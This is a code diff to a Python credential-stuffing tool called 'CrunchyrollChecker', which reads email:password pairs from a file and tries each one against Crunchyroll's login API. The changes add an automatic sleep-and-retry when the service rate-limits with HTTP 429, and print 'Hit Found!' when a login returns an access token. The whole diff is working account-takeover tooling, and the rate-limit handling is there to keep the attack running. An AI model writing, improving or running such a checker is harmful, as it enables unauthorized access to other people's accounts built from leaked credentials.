@@ -7,7 +7,9 @@ from urllib import (
     parse,
     error
 )
-import re, json
+import re
+import json
+import time
 
 
 ### Some Global Variable
@@ -43,7 +45,7 @@ class CrunchyrollChecker:
         for line in file.readlines():
             loginDetail = self._filterEmailPass(line)
             if loginDetail:
-                self._tryToLogin(self.email, self.password)
+                self._tryToLogin()
             else:
                 continue
         file.close()
@@ -65,6 +67,10 @@ class CrunchyrollChecker:
         except error.HTTPError as e:
             if e.code == 401:
                 print(f'{self.email}:{self.password} Wrong!')
+            elif e.code == 429:
+                print("Too many Requests, Let me take a sleep for 10 seconds.")
+                time.sleep(10)
+                self._tryToLogin()
             else:
                 print(e)
             self._resultSaving()
@@ -76,21 +82,18 @@ class CrunchyrollChecker:
             self.res = self.res.decode('utf-8')
             self.res = json.loads(self.res)
             if self.res['access_token']:
-                print(self.res)
+                print(f'{self.email}:{self.password} Hit Found!')
+                # print(self.res)
                 self._resultSaving(result = True)
             else:
                 print(f'{self.email}:{self.password} Something went wrong!')
                 print(self.res)
                 self._resultSaving()
     
-    def _tryToLogin(
-        self,
-        email : str,
-        password : str
-        ):
+    def _tryToLogin(self):
         data = dict(self.data)
-        data['username'] = email
-        data['password'] = password
+        data['username'] = self.email
+        data['password'] = self.password
         headers = dict(self.headers)
         headers["authorization"] = self.auth
         self._makeRequest(
